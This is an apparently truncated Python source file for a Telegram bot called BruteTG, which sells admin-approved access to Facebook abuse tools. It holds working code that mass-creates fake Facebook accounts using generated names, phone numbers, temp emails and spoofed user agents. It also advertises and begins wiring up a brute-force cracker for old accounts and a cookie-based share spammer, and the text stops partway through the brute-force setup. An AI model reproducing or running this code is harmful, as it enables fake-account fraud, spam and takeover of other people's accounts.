#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BruteTG — Telegram Bot with Admin-Approved Access
Tools: AU2 FM Maker | FB Clone (Brute) | NIKA Spam Share
"""

from __future__ import annotations
import os
import sys
import re
import json
import uuid
import random
import string
import time
import logging
import threading
import asyncio
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
from fake_useragent import UserAgent
from faker import Faker

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    ReplyKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardRemove,
)
from telegram.constants import ChatAction
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    filters,
    ContextTypes,
)

# ─── Config ──────────────────────────────────────────────────────────────────
BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
API_BASE  = os.environ.get("API_BASE_URL", "http://localhost:80/api")

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
)
log = logging.getLogger(__name__)
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)

fake = Faker()
try:
    ua_gen = UserAgent()
except Exception:
    ua_gen = None

# ─── Global event-loop reference (set in post_init) ──────────────────────────
_bot_loop: asyncio.AbstractEventLoop | None = None

# ─── Thread-safe Telegram sender ─────────────────────────────────────────────
def tg_send(bot, chat_id: int, text: str, parse_mode: str = "Markdown",
            reply_markup=None, timeout: int = 30):
    """Send a Telegram message from any thread safely."""
    if _bot_loop is None:
        return None
    coro = bot.send_message(
        chat_id, text, parse_mode=parse_mode,
        reply_markup=reply_markup, disable_web_page_preview=True,
    )
    fut = asyncio.run_coroutine_threadsafe(coro, _bot_loop)
    try:
        return fut.result(timeout=timeout)
    except Exception as e:
        log.warning("tg_send failed: %s", e)
        return None

def tg_edit(bot, chat_id: int, message_id: int, text: str,
            parse_mode: str = "Markdown", timeout: int = 30):
    """Edit a Telegram message from any thread safely."""
    if _bot_loop is None:
        return
    coro = bot.edit_message_text(
        text, chat_id=chat_id, message_id=message_id,
        parse_mode=parse_mode, disable_web_page_preview=True,
    )
    fut = asyncio.run_coroutine_threadsafe(coro, _bot_loop)
    try:
        fut.result(timeout=timeout)
    except Exception as e:
        log.warning("tg_edit failed: %s", e)

def tg_typing(bot, chat_id: int):
    """Send typing indicator from any thread safely."""
    if _bot_loop is None:
        return
    coro = bot.send_chat_action(chat_id, ChatAction.TYPING)
    fut = asyncio.run_coroutine_threadsafe(coro, _bot_loop)
    try:
        fut.result(timeout=10)
    except Exception:
        pass

# ─── Conversation states ──────────────────────────────────────────────────────
(
    STATE_IDLE,
    STATE_AWAIT_USERNAME,
    STATE_AWAIT_PASSWORD,
    STATE_AUTHENTICATED,
) = range(4)

# ─── In-memory sessions ───────────────────────────────────────────────────────
sessions: dict[str, dict] = {}

# ─── NIKA UA pool (from zip exact) ───────────────────────────────────────────
NIKA_UA_LIST = [
    "Mozilla/5.0 (Linux; Android 12; OnePlus 9 Build/SKQ1.210216.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/335.0.0.11.118;]",
    "Mozilla/5.0 (Linux; Android 13; Google Pixel 6a Build/TQ3A.230605.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/340.0.0.15.119;]",
    "Mozilla/5.0 (Linux; Android 11; SM-G998B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/336.0.0.12.120;]",
    "Mozilla/5.0 (Linux; Android 10; Pixel 4 XL Build/QD1A.190821.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/337.0.0.13.121;]",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7 Pro Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/341.0.0.16.122;]",
    "Mozilla/5.0 (Linux; Android 9; SM-G973F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/334.0.0.10.117;]",
    "Mozilla/5.0 (Linux; Android 8.1.0; Nexus 6P Build/OPM6.171019.030.B1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/333.0.0.9.116;]",
    "Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/332.0.0.8.115;]",
]

# ─── Name pool ────────────────────────────────────────────────────────────────
SINGLE_NAMES = [
    "Maria","Ana","Joy","Grace","Angel","Angela","Christine","Michelle","Sheila",
    "Maricel","Marites","Maribel","Marjorie","Jennifer","Jenny","Jessa","Jessica",
    "Janine","Katherine","Catherine","Kathleen","Karen","Karla","Camille","Bianca",
    "Patricia","Aileen","Eileen","Irene","Iris","Hazel","Cherry","Lovely","Honey",
    "Princess","Angelica","Bernadette","Rowena","Rosalie","Lourdes","Teresa","Carmela",
    "Liza","Elizabeth","Beth","Isabel","Bella","Andrea","Alexandra","Alexa","Nina",
    "Juan","Jose","Pedro","Paolo","Paul","Mark","John","Michael","Miguel","Daniel",
    "David","Andrew","Anthony","Albert","Brian","Benjamin","Carlo","Carlos","Christian",
    "Christopher","Dennis","Diego","Dominic","Edward","Emmanuel","Eric","Francis",
    "Gabriel","Henry","Ivan","James","Jasper","Joshua","Kenneth","Kevin","Lawrence",
    "Leo","Marco","Martin","Matthew","Nathan","Oliver","Patrick","Raymond","Richard",
    "Robert","Ryan","Samuel","Sebastian","Steven","Thomas","Victor","Vincent","William",
]

# ─── Helpers ──────────────────────────────────────────────────────────────────
def random_ua() -> str:
    if ua_gen:
        try: return ua_gen.random
        except Exception: pass
    return "Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 Chrome/114.0.0.0 Mobile Safari/537.36"

def windows_ua() -> str:
    v  = random.randint(80, 122)
    b  = random.randint(4000, 7000)
    p  = random.randint(50, 200)
    os_str = random.choice(["Windows NT 10.0; Win64; x64", "Windows NT 11.0; Win64; x64"])
    return f"Mozilla/5.0 ({os_str}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{v}.0.{b}.{p} Safari/537.36"

def gen_password() -> str:
    n = "".join(random.choices(string.ascii_letters, k=random.randint(5,7))).capitalize()
    s = "".join(random.choices("!@#$%&*", k=2))
    d = "".join(random.choices(string.digits, k=random.randint(2,4)))
    e = "".join(random.choices(string.ascii_letters, k=2))
    parts = [n, s, d, e]; random.shuffle(parts)
    return "".join(parts)

def bd_phone() -> str:
    pref = random.choice(["017","019","018","016","015","013","014"])
    return f"+88{pref}{''.join(random.choices(string.digits, k=8))}"

def mix_phone() -> str:
    entries = [
        ("+63", ["917","918","919","920"], 7),
        ("+91", ["98","99","97","96"],     8),
        ("+92", ["300","301","302","303"], 7),
        ("+62", ["813","815","816","817"], 7),
        ("+88", ["017","018","019"],       8),
        ("+234",["701","703","704","705"], 7),
        ("+1",  ["201","202","303","312"], 7),
    ]
    code, pfxs, ln = random.choice(entries)
    return f"{code}{random.choice(pfxs)}{''.join(random.choices(string.digits, k=ln))}"

def temp_email() -> str:
    nm = re.sub(r"[^a-z]", "", (fake.first_name()+fake.last_name()).lower())
    return f"{nm}{random.randint(1000,9999)}@xiyadmailx.xyz"

def extract_form(html: str) -> dict:
    soup = BeautifulSoup(html, "html.parser")
    d = {}
    for inp in soup.find_all("input"):
        n = inp.get("name"); v = inp.get("value","")
        if n: d[n] = v
    return d

def spinner_frames(n: int, total: int) -> str:
    frames = ["⣾","⣽","⣻","⢿","⡿","⣟","⣯","⣷"]
    pct = int((n / total) * 20) if total else 0
    bar = "█" * pct + "░" * (20 - pct)
    return f"{frames[n % len(frames)]} `[{bar}]` `{n}/{total}`"

# ─── API helpers ──────────────────────────────────────────────────────────────
def api_req(method: str, path: str, **kwargs) -> requests.Response:
    url = f"{API_BASE}{path}"
    try:
        return requests.request(method, url, timeout=15, **kwargs)
    except requests.RequestException as exc:
        log.error("API request failed: %s", exc); raise

def register_user(tg_id, tg_username, first, last):
    return api_req("POST", "/users/register", json={
        "telegramId": tg_id, "telegramUsername": tg_username or "",
        "firstName": first or "", "lastName": last or "",
    })

def check_status(tg_id):
    return api_req("GET", f"/bot/status/{tg_id}")

def verify_credentials(tg_id, username, password):
    return api_req("POST", "/bot/verify", json={
        "telegramId": tg_id, "accessUsername": username, "accessPassword": password,
    })

def log_activity(tg_id, username, tool, event, detail="", ok=True):
    try:
        api_req("POST", "/activity", json={
            "tgId": tg_id, "username": username,
            "tool": tool, "event": event, "detail": detail, "ok": ok,
        })
    except Exception:
        pass

# ─── Keep-alive ───────────────────────────────────────────────────────────────
def keep_alive():
    ping_url = f"{API_BASE}/healthz"
    while True:
        time.sleep(14 * 60)
        try:
            r = requests.get(ping_url, timeout=15)
            log.info("Keep-alive ping → %s status=%s", ping_url, r.status_code)
        except Exception as exc:
            log.warning("Keep-alive ping failed: %s", exc)

# ─── Keyboards ────────────────────────────────────────────────────────────────
WELCOME_BANNER = (
    "🔥 *WELCOME TO PREMIUM TOOLS* 🔥\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    "╔═══════════════════════════╗\n"
    "║   BruteTG Premium Suite   ║\n"
    "╚═══════════════════════════╝\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
    "🔨 *AU2 FM Maker* — FB Account Creator\n"
    "🔓 *FB Clone* — Old Account Brute Crack\n"
    "📤 *NIKA Spam Share* — Cookie Post Sharer\n"
    "━━━━━━━━━━━━━━━━━━━━━━━━━━"
)

def main_keyboard() -> ReplyKeyboardMarkup:
    return ReplyKeyboardMarkup(
        [[KeyboardButton("🔥 Tools Menu"), KeyboardButton("📊 My Status")],
         [KeyboardButton("🚪 Log Out")]],
        resize_keyboard=True,
    )

def tools_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🔨 AU2 FM Maker",            callback_data="tool_au2")],
        [InlineKeyboardButton("🔓 FB Clone (Brute Crack)",  callback_data="tool_fbclone")],
        [InlineKeyboardButton("📤 NIKA Spam Share",         callback_data="tool_nika")],
        [InlineKeyboardButton("📊 My Status",               callback_data="tool_status")],
    ])

# ─── /start ───────────────────────────────────────────────────────────────────
async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
    user  = update.effective_user
    tg_id = str(user.id)
    name  = user.first_name or "User"

    sessions.pop(tg_id, None)
    ctx.user_data.clear()

    await update.message.reply_text(
        f"👋 Welcome *{name}*!\n\nChecking your registration...",
        parse_mode="Markdown",
    )

    try:
        r = check_status(tg_id)
    except Exception:
        await update.message.reply_text("❌ Cannot reach server. Try again later.")
        return STATE_IDLE

    if r.status_code == 404:
        try:
            reg = register_user(tg_id, user.username, user.first_name, user.last_name)
        except Exception:
            await update.message.reply_text("❌ Registration failed. Try again later.")
            return STATE_IDLE
        if reg.status_code not in (201, 409):
            await update.message.reply_text(f"❌ Registration error ({reg.status_code}). Contact admin.")
            return STATE_IDLE
        await update.message.reply_text(
            "✅ *Registration submitted!*\n\n"
            "An admin will review and approve your account.\n"
            "Once approved you will receive credentials to log in.\n\n"
            "Use /status to check your approval status anytime.",
            parse_mode="Markdown",
        )
        return STATE_IDLE

    data   = r.json()
    status = data.get("status")

    if status == "pending":
        await update.message.reply_text(
            "⏳ *Your account is pending admin approval.*\n\nUse /status to check again.",
            parse_mode="Markdown",
        )
        return STATE_IDLE

    if status == "rejected":
        await update.message.reply_text(
            "❌ *Your access request was rejected.*\nContact the admin.",
            parse_mode="Markdown",
        )
        return STATE_IDLE

    if status == "approved":
        await update.message.reply_text(
            "✅ *Your account is approved!*\n\nPlease enter your bot username:",
            parse_mode="Markdown",
        )
        return STATE_AWAIT_USERNAME

    await update.message.reply_text(f"Unknown status: {status}. Contact admin.")
    return STATE_IDLE

# ─── Login flow ───────────────────────────────────────────────────────────────
async def recv_username(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
    ctx.user_data["login_username"] = update.message.text.strip()
    await update.message.reply_text("Now enter your bot password:")
    return STATE_AWAIT_PASSWORD

async def recv_password(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
    tg_id    = str(update.effective_user.id)
    username = ctx.user_data.get("login_username", "")
    password = update.message.text.strip()
    try: await update.message.delete()
    except Exception: pass

    try:
        r = verify_credentials(tg_id, username, password)
    except Exception:
        await update.message.reply_text("❌ Server error. Try again."); return STATE_IDLE

    if r.status_code != 200:
        err = r.json().get("error","Invalid credentials.")
        await update.message.reply_text(f"❌ Access denied: {err}\n\nUse /start to try again.")
        return STATE_IDLE

    result = r.json()
    sessions[tg_id] = {"verified": True, "username": username, "expiresAt": result.get("expiresAt")}

    expiry_msg = ""
    if result.get("expiresAt"):
        expiry_msg = f"\n⏰ Access expires: {result['expiresAt'][:10]}"

    await update.message.reply_text(
        f"{WELCOME_BANNER}\n\n"
        f"✅ *Authenticated as:* `{username}`{expiry_msg}\n\n"
        "Use /menu to open the tools.",
        parse_mode="Markdown", reply_markup=main_keyboard(),
    )
    log_activity(tg_id, username, "AUTH", "login", "Login successful")
    return STATE_AUTHENTICATED

# ─── /status ──────────────────────────────────────────────────────────────────
async def cmd_status(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    tg_id = str(update.effective_user.id)
    try: r = check_status(tg_id)
    except Exception:
        await update.message.reply_text("❌ Cannot reach server."); return

    if r.status_code == 404:
        await update.message.reply_text("❌ Not registered. Send /start."); return

    data    = r.json()
    status  = data.get("status","unknown")
    session = sessions.get(tg_id)
    logged  = "Yes ✅" if session and session.get("verified") else "No ❌"

    msg = (
        f"📊 *Status Report*\n━━━━━━━━━━━━━━━\n"
        f"🆔 Telegram ID: `{tg_id}`\n"
        f"📌 Approval: *{status.upper()}*\n"
        f"🔐 Logged in: {logged}"
    )
    if session and session.get("expiresAt"):
        msg += f"\n⏰ Expires: `{session['expiresAt'][:19]}`"
    await update.message.reply_text(msg, parse_mode="Markdown")

# ─── /menu ────────────────────────────────────────────────────────────────────
async def cmd_menu(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
    tg_id = str(update.effective_user.id)
    if not sessions.get(tg_id, {}).get("verified"):
        await update.message.reply_text("❌ Not authenticated. Use /start to log in.")
        return ConversationHandler.END
    await update.message.reply_text(
        f"{WELCOME_BANNER}\n\nSelect a tool below:",
        parse_mode="Markdown", reply_markup=tools_keyboard(),
    )
    return STATE_AUTHENTICATED

# ─── /help ────────────────────────────────────────────────────────────────────
async def cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        "🔥 *WELCOME TO PREMIUM TOOLS*\n\n"
        "*Commands:*\n"
        "/start    — Register or log in\n"
        "/status   — Check your approval status\n"
        "/menu     — Open the tools menu\n"
        "/au2      — AU2 FM Maker (FB account creator)\n"
        "/fbclone  — FB Clone brute crack\n"
        "/nika     — NIKA Spam Share (cookie post sharer)\n"
        "/logout   — Log out\n"
        "/help     — This help message",
        parse_mode="Markdown",
    )

# ─── Keyboard handler ─────────────────────────────────────────────────────────
async def handle_keyboard(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
    text  = update.message.text
    tg_id = str(update.effective_user.id)

    if not sessions.get(tg_id, {}).get("verified"):
        await update.message.reply_text("❌ Not authenticated. Use /start.")
        return STATE_IDLE

    if text in ("🔥 Tools Menu", "Tools Menu"):
        await update.message.reply_text(
            f"{WELCOME_BANNER}\n\nSelect a tool below:",
            parse_mode="Markdown", reply_markup=tools_keyboard(),
        )
        return STATE_AUTHENTICATED
    elif text in ("📊 My Status", "My Status"):
        await cmd_status(update, ctx); return STATE_AUTHENTICATED
    elif text in ("🚪 Log Out", "Log Out"):
        return await cmd_logout(update, ctx)

    tool = ctx.user_data.get("active_tool")
    if tool == "au2":    return await handle_au2_input(update, ctx)
    if tool == "fbclone": return await handle_clone_input(update, ctx)
    if tool == "nika":   return await handle_nika_input(update, ctx)

    await update.message.reply_text("Use /menu to see tools.")
    return STATE_AUTHENTICATED

# ─── Inline callback handler ──────────────────────────────────────────────────
async def handle_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    tg_id = str(query.from_user.id)

    if not sessions.get(tg_id, {}).get("verified"):
        await query.edit_message_text("❌ Session expired. Use /start.")
        return STATE_AUTHENTICATED

    data = query.data

    if data == "tool_au2":
        ctx.user_data.update({"active_tool": "au2", "au2_step": "contact_type"})
        await query.edit_message_text(
            "🔨 *AU2 FM Maker — Facebook Account Creator*\n\n"
            "Choose contact type for registration:\n\n"
            "`1` — Bangladesh Temp Number (+88)\n"
            "`2` — Mix Country Number (PH/IN/PK/ID/NG/US)\n"
            "`3` — Temp Email Address\n\n"
            "Reply with *1*, *2*, or *3*:",
            parse_mode="Markdown",
        )
        return STATE_AUTHENTICATED

    elif data == "tool_fbclone":
        ctx.user_data.update({"active_tool": "fbclone", "clone_step": "series"})
        await query.edit_message_text(
            "🔓 *FB Clone — Old Account Brute Crack*\n\n"
            "Choose UID series to brute force:\n\n"
            "`A` — All Series (2010-2014)\n"
            "`B` — 100003/4 Series\n"
            "`C` — 2009 Series (1000004xxxxxxxx)\n\n"
            "Reply with *A*, *B*, or *C*:",
            parse_mode="Markdown",
        )
        return STATE_AUTHENTICATED

    elif data == "tool_nika":
        ctx.user_data.update({
            "active_tool": "nika",
            "nika_step": "cookie_count",
            "nika_tokens": [],
            "nika_cookies_list": [],
            "nika_cookie_idx": 0,
            "nika_total_cookies": 0,
        })
        await query.edit_message_text(
            "📤 *NIKA Spam Share*\n"
            "Cookie-Based Facebook Post Sharer\n\n"
            "Supports multiple cookies for high-speed sharing.\n\n"
            "How many cookies to use? (1-10)\n\n"
            "Reply with a number:",
            parse_mode="Markdown",
        )
        return STATE_AUTHENTICATED

    elif data == "tool_status":
        sess   = sessions.get(tg_id, {})
        expiry = sess.get("expiresAt","Permanent ♾️")
        if expiry and expiry != "Permanent ♾️": expiry = expiry[:19]
        await query.edit_message_text(
            f"📊 *Session Status*\n━━━━━━━━━━━━━━━\n"
            f"👤 User: `{sess.get('username','N/A')}`\n"
            f"⏰ Expires: `{expiry}`",
            parse_mode="Markdown",
        )
        return STATE_AUTHENTICATED

    elif data == "back_menu":
        ctx.user_data.pop("active_tool", None)
        await query.edit_message_text(
            f"{WELCOME_BANNER}\n\nSelect a tool below:",
            parse_mode="Markdown", reply_markup=tools_keyboard(),
        )
        return STATE_AUTHENTICATED

    return STATE_AUTHENTICATED


# ══════════════════════════════════════════════════════════════════════════════
#  AU2 FM MAKER — Facebook Account Creator (NO LIMITS, from zip)
# ══════════════════════════════════════════════════════════════════════════════

async def cmd_au2(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
    tg_id = str(update.effective_user.id)
    if not sessions.get(tg_id, {}).get("verified"):
        await update.message.reply_text("❌ Not authenticated. Use /start."); return ConversationHandler.END
    ctx.user_data.update({"active_tool": "au2", "au2_step": "contact_type"})
    await update.message.reply_text(
        "🔨 *AU2 FM Maker — Facebook Account Creator*\n\n"
        "Choose contact type:\n\n"
        "`1` — Bangladesh Temp Number (+88)\n"
        "`2` — Mix Country Number (PH/IN/PK/ID/NG/US)\n"
        "`3` — Temp Email Address\n\n"
        "Reply with *1*, *2*, or *3*:",
        parse_mode="Markdown",
    )
    return STATE_AUTHENTICATED


async def handle_au2_input(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
    tg_id    = str(update.effective_user.id)
    username = sessions.get(tg_id, {}).get("username", "")
    step     = ctx.user_data.get("au2_step", "")
    text     = update.message.text.strip()

    if step == "contact_type":
        if text not in ("1","2","3"):
            await update.message.reply_text("❌ Reply with 1, 2, or 3."); return STATE_AUTHENTICATED
        ctx.user_data["au2_contact"] = text
        ctx.user_data["au2_step"]    = "count"
        await update.message.reply_text(
            "🔢 How many accounts to create?\n\n"
            "_No limit — you decide how many (e.g. 10, 100, 500)_\n\n"
            "Reply with any positive number:",
            parse_mode="Markdown",
        )
        return STATE_AUTHENTICATED

    elif step == "count":
        try:
            n = int(text)
            if n < 1: raise ValueError
        except ValueError:
            await update.message.reply_text("❌ Enter a valid positive number."); return STATE_AUTHENTICATED
        ctx.user_data["au2_count"] = n
        ctx.user_data["au2_step"]  = "pass_type"
        await update.message.reply_text(
            "🔑 Choose password type:\n\n"
            "`1` — Auto-generate strong random password\n"
            "`2` — Set your own custom password\n\n"
            "Reply with *1* or *2*:",
            parse_mode="Markdown",
        )
        return STATE_AUTHENTICATED

    elif step == "pass_type":
        if text not in ("1","2"):
            await update.message.reply_text("❌ Reply with 1 or 2."); return STATE_AUTHENTICATED
        if text == "1":
            ctx.user_data["au2_pw"]   = gen_password()
            ctx.user_data["au2_step"] = None
            ctx.user_data.pop("active_tool", None)
            _launch_au2(update, ctx, tg_id, username)
        else:
            ctx.user_data["au2_step"] = "custom_pw"
            await update.message.reply_text("Enter your custom password (min 6 chars):")
        return STATE_AUTHENTICATED

    elif step == "custom_pw":
        if len(text) < 6:
            await update.message.reply_text("❌ Password must be at least 6 characters."); return STATE_AUTHENTICATED
        ctx.user_data["au2_pw"]   = text
        ctx.user_data["au2_step"] = None
        ctx.user_data.pop("active_tool", None)
        _launch_au2(update, ctx, tg_id, username)
        return STATE_AUTHENTICATED

    await update.message.reply_text("Unknown step. Use /au2 to restart.")
    return STATE_AUTHENTICATED


def _launch_au2(update: Update, ctx: ContextTypes.DEFAULT_TYPE, tg_id: str, username: str):
    """Launch AU2 in a background thread."""
    contact = ctx.user_data.get("au2_contact","1")
    count   = ctx.user_data.get("au2_count", 1)
    pw      = ctx.user_data.get("au2_pw", gen_password())
    bot     = ctx.application.bot
    chat_id = update.effective_chat.id
    threading.Thread(
        target=run_au2,
        args=(bot, chat_id, tg_id, username, contact, count, pw),
        daemon=True,
    ).start()


def run_au2(bot, chat_id: int, tg_id: str, username: str,
            contact: str, count: int, pw: str):
    """AU2 FM Maker — full account creation logic from zip. Runs in background thread."""
    contact_label = {"1":"BD Number","2":"Mix Country Number","3":"Temp Email"}.get(contact,"?")

    # Send start message and get its ID for live editing
    msg = tg_send(
        bot, chat_id,
        f"🔨 *AU2 FM Maker Starting...*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📋 Contact type: `{contact_label}`\n"
        f"🔢 Total accounts: `{count}`\n"
        f"🔑 Password: `{pw}`\n\n"
        f"⣾ `[░░░░░░░░░░░░░░░░░░░░]` `0/{count}`\n"
        f"⏳ Starting...",
    )
    progress_msg_id = msg.message_id if msg else None
    log_activity(tg_id, username, "AU2", "start", f"count={count} contact={contact}")

    ok_list  = []
    cp_list  = []
    fail_list = []
    reg_url  = "https://m.facebook.com/reg/"
    sub_url  = "https://www.facebook.com/reg/submit/"
    last_edit = time.time()

    for i in range(count):
        tg_typing(bot, chat_id)
        try:
            ses  = requests.Session()
            resp = ses.get(reg_url, headers={"User-Agent": random_ua()}, timeout=20)
            form = extract_form(resp.text)
            name = random.choice(SINGLE_NAMES)

            if   contact == "1": contact_val = bd_phone()
            elif contact == "2": contact_val = mix_phone()
            else:                contact_val = temp_email()

            bday  = random.randint(15, 25)
            bmon  = random.randint(1, 12)
            byear = random.randint(1985, 2001)

            payload = {
                "ccp":"2",
                "reg_instance":       form.get("reg_instance",""),
                "submission_request": "true",
                "reg_impression_id":  form.get("reg_impression_id",""),
                "ns":"1",
                "logger_id":          form.get("logger_id",""),
                "firstname":          name,
                "lastname":           name,
                "birthday_day":       str(bday),
                "birthday_month":     str(bmon),
                "birthday_year":      str(byear),
                "reg_email__":        contact_val,
                "sex":"1",
                "encpass":            f"#PWD_BROWSER:0:{int(time.time())}:{pw}",
                "submit":             "Sign Up",
                "fb_dtsg":            form.get("fb_dtsg",""),
                "jazoest":            form.get("jazoest",""),
                "lsd":                form.get("lsd",""),
            }
            headers = {
                "Host":               "m.facebook.com",
                "Connection":         "keep-alive",
                "User-Agent":         random_ua(),
                "Accept":             "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Encoding":    "gzip, deflate, br",
                "Accept-Language":    "en-US,en;q=0.9",
                "cache-control":      "max-age=0",
                "referer":            "https://mbasic.facebook.com/reg/",
                "sec-ch-ua-mobile":   "?1",
                "sec-ch-ua-platform": "Android",
                "sec-fetch-dest":     "document",
                "sec-fetch-mode":     "navigate",
                "sec-fetch-site":     "same-origin",
                "upgrade-insecure-requests": "1",
            }

            sub = ses.post(sub_url, data=payload, headers=headers, timeout=25, allow_redirects=True)
            cki = ses.cookies.get_dict()

            if "c_user" in cki:
                uid  = cki["c_user"]
                cstr = "; ".join(f"{k}={v}" for k, v in cki.items())
                ok_list.append(f"{uid}|{pw}|{contact_val}")
                tg_send(
                    bot, chat_id,
                    f"✅ *[{i+1}/{count}] Account Created!*\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"👤 Name:     `{name}`\n"
                    f"🆔 UID:      `{uid}`\n"
                    f"📞 Contact:  `{contact_val}`\n"
                    f"🔑 Password: `{pw}`\n"
                    f"🎂 DOB:      `{bday}/{bmon}/{byear}`\n"
                    f"✅ OK: `{len(ok_list)}`  ⚠️ CP: `{len(cp_list)}`",
                )
                log_activity(tg_id, username, "AU2", "ok", f"uid={uid}", ok=True)

            elif "checkpoint" in cki or (hasattr(sub, "url") and "checkpoint" in sub.url):
                cp_list.append(contact_val)
                tg_send(bot, chat_id,
                    f"⚠️ *[{i+1}/{count}] Checkpoint hit*\n"
                    f"📞 `{contact_val}`\n"
                    f"✅ OK: `{len(ok_list)}`  ⚠️ CP: `{len(cp_list)}`",
                )
                log_activity(tg_id, username, "AU2", "checkpoint", contact_val, ok=False)

            else:
                fail_list.append(contact_val)
                tg_send(bot, chat_id,
                    f"❌ *[{i+1}/{count}] Failed*\n"
                    f"📞 `{contact_val}`",
                )

            # Update progress bar every 5 accounts
            if progress_msg_id and (i + 1) % 5 == 0 and time.time() - last_edit > 2:
                tg_edit(
                    bot, chat_id, progress_msg_id,
                    f"🔨 *AU2 FM Maker Running...*\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"📋 Contact: `{contact_label}`\n"
                    f"🔢 Total:   `{count}`\n"
                    f"🔑 Password: `{pw}`\n\n"
                    f"{spinner_frames(i+1, count)}\n"
                    f"✅ OK: `{len(ok_list)}`  "
                    f"⚠️ CP: `{len(cp_list)}`  "
                    f"❌ Fail: `{len(fail_list)}`",
                )
                last_edit = time.time()

            time.sleep(random.uniform(1.5, 3.0))

        except Exception as e:
            log.warning("AU2 error #%d: %s", i+1, e)
            fail_list.append("error")
            tg_send(bot, chat_id, f"⚠️ [{i+1}/{count}] Error: `{str(e)[:80]}`")
            time.sleep(5)

    # Final summary
    tg_send(
        bot, chat_id,
        f"🏁 *AU2 FM Maker — DONE!*\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"✅ *Created:*    `{len(ok_list)}`\n"
        f"⚠️ *Checkpoint:* `{len(cp_list)}`\n"
        f"❌ *Failed:*     `{len(fail_list)}`\n"
        f"🔢 *Total run:*  `{count}`\n\n"
        "Use /menu to run another tool.",
    )
    log_activity(tg_id, username, "AU2", "done", f"ok={len(ok_list)} cp={len(cp_list)}")


# ══════════════════════════════════════════════════════════════════════════════
#  FB CLONE — Old Account Brute Crack (NO LIMITS, from zip)
# ══════════════════════════════════════════════════════════════════════════════

async def cmd_fbclone(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
    tg_id = str(update.effective_user.id)
    if not sessions.get(tg_id, {}).get("verified"):
        await update.message.reply_text("❌ Not authenticated. Use /start."); return ConversationHandler.END
    ctx.user_data.update({"active_tool": "fbclone", "clone_step": "series"})
    await update.message.reply_text(
        "🔓 *FB Clone — Old Account Brute Crack*\n\n"
        "Choose UID series:\n\n"
        "`A` — All Series (2010-2014)\n"
        "`B` — 100003/4 Series\n"
        "`C` — 2009 Series\n\n"
        "Reply with *A*, *B*, or *C*:",
        parse_mode="Markdown",
    )
    return STATE_AUTHENTICATED


async def handle_clone_input(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
    tg_id    = str(update.effective_user.id)
    username = sessions.get(tg_id, {}).get("username","")
    step     = ctx.user_data.get("clone_step","")
    text     = update.message.text.strip().upper()

    if step == "series":
        if text not in ("A","B","C"):
            await update.message.reply_text("❌ Reply with A, B, or C."); return STATE_AUTHENTICATED
        ctx.user_data["clone_series"] = text
        ctx.user_data["clone_step"]   = "count"
        await update.message.reply_text(
            "🔢 How many UIDs to try?\n\n"
            "_No limit — you decide (e.g. 10000, 50000, 100000)_\n\n"
            "Reply with any positive number:",
            parse_mode="Markdown",
        )
        return STATE_AUTHENTICATED

    elif step == "count":
        try:
            n = int(text)
            if n < 1: raise ValueError
        except ValueError:
